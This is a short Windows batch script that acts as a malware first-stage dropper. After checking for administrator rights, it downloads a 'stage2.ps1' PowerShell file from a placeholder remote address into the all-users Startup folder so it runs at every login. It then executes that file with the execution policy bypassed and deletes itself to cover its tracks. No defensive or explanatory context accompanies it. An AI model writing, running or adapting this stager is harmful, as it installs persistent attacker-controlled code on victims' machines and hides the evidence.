@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script requires administrative privileges. Please run as administrator.
    pause
    exit /b 1
)
curl --output-dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" --output stage2.ps1 http://[ip]:[port]/[token]/stage2.ps1 > nul 2>&1
powershell -ExecutionPolicy Bypass -File "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\stage2.ps1"
call :deleteSelf&exit /b
:deleteSelf
start /b "" cmd /c del "%~f0"&exit /b

